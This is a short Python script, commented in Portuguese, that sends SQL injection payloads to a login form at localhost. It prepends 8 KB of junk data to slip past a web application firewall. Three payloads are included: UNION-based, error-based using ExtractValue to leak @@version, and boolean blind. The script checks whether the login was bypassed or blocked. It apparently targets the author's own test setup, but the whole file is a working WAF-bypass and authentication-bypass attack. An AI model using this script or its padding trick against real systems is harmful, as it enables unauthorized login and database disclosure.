import urllib.request
import urllib.parse

# Configuração
# Certifique-se de que este DNS é o do seu ALB atual
url = "http://localhost/sqli-login.php"

# 1. Gerar 8KB de lixo (O Bypass do WAF)
lixo = "A" * 8192

# ==============================================================================
# ÁREA DE TESTE - ESCOLHA SEU PAYLOAD AQUI
# Descomente apenas um payload por vez para testar
# ==============================================================================

# --- CASO 1: UNION BASED (Fabricar um usuário falso) ---
# Tenta unir o resultado com uma linha falsa (1, 'hacker', '123')
# payload_ataque = "' UNION SELECT 1, 2, 3 -- " 
# (Nota: Se falhar, tente ajustar o número de colunas: 1, 2, 3, 4...)

# --- CASO 2: ERROR BASED (Extrair versão via erro XML) ---
#payload_ataque = "' AND ExtractValue(1, concat(0x3a, @@version)) -- "

# --- CASO 3: BOOLEAN BLIND (Adivinhar versão do banco) ---
# Se a versão começar com 1, o login funciona. Se não, falha.
payload_ataque = "' OR (SUBSTRING(@@version, 1, 1) = '1') -- "

# ==============================================================================

# 3. Construir os dados
# O 'lixo' vem primeiro para cegar o WAF.
# O payload é injetado no usuário E na senha para garantir a execução.
dados_form = [
    ('lixo', lixo),
    ('usuario', payload_ataque),
    ('senha', 'qualquercoisa') 
]

dados_codificados = urllib.parse.urlencode(dados_form).encode('utf-8')

print(f"[+] Enviando requisicao com {len(dados_codificados)} bytes...")
print(f"[+] Payload de teste: {payload_ataque}")

req = urllib.request.Request(url, data=dados_codificados, method='POST')

try:
    with urllib.request.urlopen(req) as response:
        html = response.read().decode('utf-8')
        
        # Verificação de Sucesso (Login)
        if "Login realizado com sucesso!" in html:
            print("\n[VITORIA] SUCESSO! O login ocorreu.")
            print("Isso indica que a injeção SQL funcionou e retornou verdadeiro/dados.")
        else:
            print("\n[FALHA] O login não ocorreu (ou deu erro 500).")
            # Imprime um pedaço do HTML para ajudar a debugar erros (ex: erro de SQL na tela)
            print("Trecho da resposta:", html[:300])
            
except urllib.error.HTTPError as e:
    print(f"\n[BLOQUEIO] O servidor retornou erro: {e.code} {e.reason}")
    if e.code == 403:
        print("O WAF bloqueou. O bypass de 8KB pode ter falhado.")
    elif e.code == 500:
        print("Erro interno do servidor. Provavelmente erro de sintaxe SQL (colunas erradas no UNION?).")
except Exception as e:
    print(f"\n[ERRO] {e}")
